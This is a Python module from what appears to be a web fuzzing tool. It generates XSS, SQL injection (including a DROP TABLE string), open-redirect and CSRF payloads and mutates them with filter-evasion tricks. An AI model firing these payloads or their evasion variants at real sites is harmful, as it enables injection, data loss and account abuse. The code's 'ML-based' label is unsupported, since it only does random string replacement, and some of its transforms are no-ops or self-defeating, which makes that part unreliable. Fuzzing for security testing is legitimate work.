#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ML-based payload enhancement for PhantomFuzzer.

This module provides ML-based enhancement for payload generation,
allowing for more effective vulnerability testing.
"""

import os
import re
import json
import random
from typing import Dict, List, Any, Optional, Union, Set, Tuple
from pathlib import Path

# Import from phantomfuzzer package
from phantomfuzzer.utils.logging import get_module_logger


class MLPayloadEnhancer:
    """ML-based payload enhancer for PhantomFuzzer.
    
    This class enhances payload generation using machine learning techniques
    to create more effective payloads for vulnerability testing.
    """
    
    def __init__(self, model_name: Optional[str] = None):
        """Initialize the ML payload enhancer.
        
        Args:
            model_name: Name of the ML model to use for enhancement.
                If None, use the default model.
        """
        self.logger = get_module_logger('ml_payload_enhancer')
        self.model_name = model_name
        
        # Load base payloads
        self.base_payloads = self._load_base_payloads()
        
        # Initialize mutation patterns
        self.mutation_patterns = self._load_mutation_patterns()
        
        # Load evasion techniques
        self.evasion_techniques = self._load_evasion_techniques()
        
        self.logger.info("ML payload enhancer initialized")
    
    def _load_base_payloads(self) -> Dict[str, List[str]]:
        """Load base payloads for different vulnerability categories.
        
        Returns:
            Dictionary mapping vulnerability categories to lists of base payloads.
        """
        # Default base payloads
        base_payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '"><script>alert(1)</script>',
                '\';alert(1);//'
            ],
            'sql_injection': [
                "' OR 1=1 --",
                "\" OR 1=1 --",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "' UNION SELECT 1,2,3 --",
                "'; DROP TABLE users; --"
            ],
            'open_redirect': [
                'https://evil.com',
                '//evil.com',
                '/\\evil.com',
                'javascript:document.location="https://evil.com"',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
            ],
            'csrf': [
                '<form action="https://victim.com/change_password" method="POST">',
                '<img src="https://victim.com/api/delete?id=123">',
                '<script>fetch("https://victim.com/api/update", {method: "POST", body: JSON.stringify({data: "malicious"})})</script>'
            ]
        }
        
        # Try to load payloads from files
        try:
            payload_dir = Path(__file__).parent.parent / 'data' / 'payloads'
            if payload_dir.exists():
                for category in base_payloads.keys():
                    payload_file = payload_dir / f"{category}.txt"
                    if payload_file.exists():
                        with open(payload_file, 'r') as f:
                            file_payloads = [line.strip() for line in f if line.strip()]
                            if file_payloads:
                                base_payloads[category] = file_payloads
                                self.logger.debug(f"Loaded {len(file_payloads)} payloads for {category}")
        except Exception as e:
            self.logger.warning(f"Error loading payloads from files: {str(e)}")
        
        return base_payloads
    
    def _load_mutation_patterns(self) -> Dict[str, List[Dict[str, Any]]]:
        """Load mutation patterns for different vulnerability categories.
        
        Returns:
            Dictionary mapping vulnerability categories to lists of mutation patterns.
        """
        # Default mutation patterns
        mutation_patterns = {
            'xss': [
                {'pattern': '<script>', 'replacements': ['<sCrIpT>', '<%73cript>', '<script/>', '<scr<script>ipt>']},
                {'pattern': 'alert', 'replacements': ['al\\u0065rt', 'al\u0065rt', 'prompt', 'confirm', 'eval("ale"+"rt")']},
                {'pattern': 'onerror', 'replacements': ['OnErRoR', 'on\u0065rror', 'onerror\u0000', 'onerror\u0009']},
                {'pattern': '=', 'replacements': ['&#x3D;', '&#61;', '\u003d', '\x3d', '=']}
            ],
            'sql_injection': [
                {'pattern': 'OR', 'replacements': ['||', 'OR/**/1', 'O/**/R', '\u004f\u0052']},
                {'pattern': '=', 'replacements': ['<>', 'LIKE', 'IS', '>=', '<=']},
                {'pattern': '--', 'replacements': ['#', '/*', ';--', ';#', ';\u002d\u002d']},
                {'pattern': 'UNION', 'replacements': ['UN\u0049ON', 'UN/**/ION', 'UN%09ION', 'UNION ALL']}
            ],
            'open_redirect': [
                {'pattern': 'https://', 'replacements': ['hTtPs://', '%68%74%74%70%73%3a%2f%2f', 'https:%0D%0A//', 'https:/\\']},
                {'pattern': 'evil.com', 'replacements': ['ev\u0069l.com', 'evil%2ecom', 'evil\u3002com', 'xn--evil-rg4c.com']}
            ],
            'csrf': [
                {'pattern': '<form', 'replacements': ['<FORM', '<f\u006frm', '<form\u0009', '<form\u000a']},
                {'pattern': 'method=', 'replacements': ['METHOD=', 'method\u003d', 'method%3d', 'method =']},
                {'pattern': 'action=', 'replacements': ['ACTION=', 'action\u003d', 'action%3d', 'action =']}
            ]
        }
        
        return mutation_patterns
    
    def _load_evasion_techniques(self) -> Dict[str, List[Dict[str, Any]]]:
        """Load evasion techniques for different vulnerability categories.
        
        Returns:
            Dictionary mapping vulnerability categories to lists of evasion techniques.
        """
        # Default evasion techniques
        evasion_techniques = {
            'xss': [
                {'name': 'case_variation', 'function': lambda p: p.replace('script', 'sCrIpT')},
                {'name': 'encoding', 'function': lambda p: p.replace('<', '&lt;').replace('>', '&gt;')},
                {'name': 'double_encoding', 'function': lambda p: p.replace('<', '%26lt%3B').replace('>', '%26gt%3B')},
                {'name': 'null_byte', 'function': lambda p: p.replace('<', '<\u0000')},
                {'name': 'comment_insertion', 'function': lambda p: p.replace('script', 'scr<!-- comment -->ipt')}
            ],
            'sql_injection': [
                {'name': 'comment_insertion', 'function': lambda p: p.replace('OR', 'O/**/R')},
                {'name': 'case_variation', 'function': lambda p: p.replace('UNION', 'UnIoN')},
                {'name': 'whitespace_variation', 'function': lambda p: p.replace(' ', '\t')},
                {'name': 'string_concatenation', 'function': lambda p: p.replace('SELECT', 'SE'+'LECT')},
                {'name': 'alternative_encoding', 'function': lambda p: p.replace('\'', '%27')}
            ],
            'open_redirect': [
                {'name': 'url_encoding', 'function': lambda p: p.replace(':', '%3A').replace('/', '%2F')},
                {'name': 'double_encoding', 'function': lambda p: p.replace(':', '%253A').replace('/', '%252F')},
                {'name': 'unicode_normalization', 'function': lambda p: p.replace('.', '\u3002')},
                {'name': 'path_manipulation', 'function': lambda p: p.replace('/', '/\\')},
                {'name': 'protocol_obfuscation', 'function': lambda p: p.replace('https://', 'https:/\\')}
            ],
            'csrf': [
                {'name': 'attribute_obfuscation', 'function': lambda p: p.replace('method=', 'method =')},
                {'name': 'case_variation', 'function': lambda p: p.replace('form', 'FoRm')},
                {'name': 'whitespace_insertion', 'function': lambda p: p.replace('<', '< ')},
                {'name': 'attribute_encoding', 'function': lambda p: p.replace('=', '&#x3D;')},
                {'name': 'comment_insertion', 'function': lambda p: p.replace('action=', 'action<!-- -->=')},
            ]
        }
        
        return evasion_techniques
    
    def enhance_payload(self, payload: str, category: str, context: Optional[Dict[str, Any]] = None) -> str:
        """Enhance a payload using ML techniques.
        
        Args:
            payload: The base payload to enhance.
            category: The vulnerability category (e.g., 'xss', 'sql_injection').
            context: Optional context information for enhancement.
                
        Returns:
            Enhanced payload.
        """
        if not payload:
            return payload
        
        context = context or {}
        advanced = context.get('advanced', False)
        
        # Apply basic mutations
        enhanced_payload = self._apply_mutations(payload, category)
        
        # Apply advanced evasion techniques if requested
        if advanced:
            enhanced_payload = self._apply_evasion_techniques(enhanced_payload, category)
        
        # Apply context-specific enhancements
        if 'target_context' in context:
            enhanced_payload = self._apply_context_specific_enhancements(
                enhanced_payload, category, context['target_context']
            )
        
        return enhanced_payload
    
    def _apply_mutations(self, payload: str, category: str) -> str:
        """Apply mutations to a payload.
        
        Args:
            payload: The payload to mutate.
            category: The vulnerability category.
                
        Returns:
            Mutated payload.
        """
        if category not in self.mutation_patterns:
            return payload
        
        mutated_payload = payload
        
        # Apply random mutations
        for mutation in random.sample(self.mutation_patterns[category], 
                                     min(2, len(self.mutation_patterns[category]))):
            pattern = mutation['pattern']
            if pattern in mutated_payload:
                replacement = random.choice(mutation['replacements'])
                # Only replace one occurrence to avoid over-mutation
                mutated_payload = mutated_payload.replace(pattern, replacement, 1)
        
        return mutated_payload
    
    def _apply_evasion_techniques(self, payload: str, category: str) -> str:
        """Apply evasion techniques to a payload.
        
        Args:
            payload: The payload to enhance with evasion techniques.
            category: The vulnerability category.
                
        Returns:
            Enhanced payload with evasion techniques applied.
        """
        if category not in self.evasion_techniques:
            return payload
        
        # Apply a random evasion technique
        if self.evasion_techniques[category]:
            technique = random.choice(self.evasion_techniques[category])
            try:
                return technique['function'](payload)
            except Exception as e:
                self.logger.warning(f"Error applying evasion technique {technique['name']}: {str(e)}")
        
        return payload
    
    def _apply_context_specific_enhancements(self, payload: str, category: str, target_context: str) -> str:
        """Apply context-specific enhancements to a payload.
        
        Args:
            payload: The payload to enhance.
            category: The vulnerability category.
            target_context: The target context (e.g., 'html', 'javascript', 'url').
                
        Returns:
            Enhanced payload for the specific context.
        """
        if category == 'xss':
            if target_context == 'html':
                # For HTML context, use HTML-specific payloads
                if '<script>' not in payload and random.random() < 0.5:
                    return f'<img src=x onerror={payload}>'
                return payload
            
            elif target_context == 'javascript':
                # For JavaScript context, use JS-specific payloads
                if 'alert' in payload:
                    return payload.replace('alert', 'eval')
                return payload
            
            elif target_context == 'attribute':
                # For attribute context, use attribute-specific payloads
                if '<' in payload:
                    return payload.replace('<', '&lt;')
                return f'" onmouseover="{payload}" "'
            
            elif target_context == 'css':
                # For CSS context, use CSS-specific payloads
                return f'expression({payload})'
        
        elif category == 'sql_injection':
            if target_context == 'numeric':
                # For numeric context, use numeric-specific payloads
                return payload.replace('\'', '')
            
            elif target_context == 'string':
                # For string context, ensure quotes are handled
                if '\'' not in payload:
                    return f"' {payload} '"
                return payload
        
        return payload
    
    def generate_payloads(self, category: str, count: int = 5, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate enhanced payloads for a specific vulnerability category.
        
        Args:
            category: The vulnerability category (e.g., 'xss', 'sql_injection').
            count: Number of payloads to generate.
            context: Optional context information for enhancement.
                
        Returns:
            List of enhanced payloads.
        """
        if category not in self.base_payloads:
            self.logger.warning(f"Unknown category: {category}")
            return []
        
        # Get base payloads for the category
        base_payloads = self.base_payloads[category]
        
        # If we don't have enough base payloads, use what we have
        if len(base_payloads) < count:
            selected_payloads = base_payloads
        else:
            # Select a subset of base payloads
            selected_payloads = random.sample(base_payloads, count)
        
        # Enhance each selected payload
        enhanced_payloads = []
        for payload in selected_payloads:
            enhanced_payload = self.enhance_payload(payload, category, context)
            enhanced_payloads.append(enhanced_payload)
        
        # If we still need more payloads, generate variations
        while len(enhanced_payloads) < count:
            # Select a random base payload
            base_payload = random.choice(base_payloads)
            
            # Enhance it differently
            enhanced_payload = self.enhance_payload(base_payload, category, context)
            
            # Add it if it's not already in the list
            if enhanced_payload not in enhanced_payloads:
                enhanced_payloads.append(enhanced_payload)
        
        return enhanced_payloads
